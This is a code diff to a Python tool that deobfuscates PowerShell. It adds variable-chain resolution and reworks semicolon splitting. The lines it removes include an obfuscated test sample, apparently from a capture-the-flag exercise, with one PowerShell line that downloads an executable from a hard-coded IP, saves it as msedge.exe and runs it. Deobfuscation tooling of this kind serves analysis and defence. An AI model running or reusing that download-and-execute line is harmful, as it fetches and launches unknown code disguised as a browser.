@@ -275,6 +275,33 @@ def replace_multiple_variables_and_extra_concat(code):
     newcode = ''.join([i for i in newcoderes])
     return newcode
 
+def replace_multiple_variables2(code):
+    lines = code.split('\n')
+    variables = {}
+    for line in lines:
+        match = re.match(r'^(\$\w+(?:\s*=\s*\$\w+)*\s*)=\s*(.+)', line)
+        if match:
+            value = match.group(2).strip()
+            var_chain = reversed([v.strip() for v in match.group(1).split('=')])
+            prev_var = value
+            for var in var_chain:
+                variables[var] = prev_var
+                prev_var = var
+    
+    def replace_var(match):
+        var = match.group(0)
+        while var in variables:
+            var = variables[var]
+        return var
+    
+    newcode = []
+    for line in lines:
+        if not line.strip().startswith('$'):
+            line = re.sub(r'\$\w+', replace_var, line)
+        newcode.append(line)
+    
+    return '\n'.join(newcode)
+
 
 def deobfuscate(code):
     try:
@@ -284,50 +311,48 @@ def deobfuscate(code):
         code = Replace(code)
         checkcode = code.split('\n')
         codetemp = []
-        semicolon_sign = []
         for i in range(len(checkcode)):
             checkcode[i] += "\n"
             if ';' in checkcode[i]:
                 checkcode[i] = semicolon_case(checkcode[i])
-                semicolon_sign.append(i)
+                parts = [part.lstrip(' ') for part in checkcode[i].split(';')]
+                if parts[-1] == '\n':
+                    parts = parts[:-1]
+                if len(parts) == 1:
+                    codetemp.append(parts[0] + '\n')
+                    continue
+                for j in parts:
+                    if parts.index(j) == len(parts) - 1:
+                        codetemp.append(j)
+                    else:
+                        codetemp.append(j + '\n')
             else:
                 codetemp.append(checkcode[i])
-        codetemp2 = ''.join([i for i in codetemp])
-        codetemp2 = replace_multiple_variables_and_extra_concat(codetemp2)
-        checkcode2 = codetemp2.split('\n')[:-1]
+        codetobecheckedonly = []
+        notvariablevalue = []
+        for j in range(len(codetemp)):
+            if re.match(r'\$\w+\s*[\+=]+\s*.+', codetemp[j]):
+                codetobecheckedonly.append(codetemp[j])
+            else:
+                notvariablevalue.append(j)
+        code = ''.join([i for i in codetobecheckedonly])
+        code = replace_multiple_variables_and_extra_concat(code)
+        checkcode = code.split('\n')
+        if checkcode[-1] == '':
+            checkcode = checkcode[:-1]
         j = 0
-        for i in range(len(checkcode)):
-            if i in semicolon_sign:
+        for i in range(len(codetemp)):
+            if i in notvariablevalue:
                 continue
-            checkcode2[j] += "\n"
-            checkcode[i] = checkcode2[j]
+            checkcode[j] += "\n"
+            codetemp[i] = checkcode[j]
             j += 1
-            if j == len(checkcode2):
-                checkcode = checkcode[:j+1]
+            if j == len(checkcode):
+                codetemp = codetemp[:i+1]
                 break
-        code = ''.join([i.replace('\n', '') if i == checkcode[-1] else i for i in checkcode])
+        code = ''.join([i if i != codetemp[-1] else i.rstrip('\n') for i in codetemp])
         code = decoding(code)
+        code = replace_multiple_variables2(code)
     except:
         code = "Something's wrong with the code!"
     return code
-
-testing = """
-$tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
-$tes2 += [ChaR](98   -  10  - 10 + 1) + [CHAR](109 -bxor   4)
-$tes2 = [ChaR](99   -  10  - 10 + 1)         +          [CHAR](109 -bxor   4)
-$tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
-$tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
-$tes5 = $tessss = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
-$u='ht'+'tp://192.168.0.16:8282/B64_deC'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
-$tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
-$tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
-$tesss = pe
-$tesss += [ChaR](100   -  10  - 10 + 1) + [CHAR](109 -bxor   4) + $tes7
-$tes8 = $tesss + [CHAR](109 -bxor   3)
-$s10 = $tesss + [CHAR](109 -bxor   3)
-$tes9 = [CHAr](109 + 2) + $tes + [CHAR](109 -bxor   5)
-$aa = ayam goreng enak loh
-$bb = a + $aa
-"""
-
-print(deobfuscate(testing))
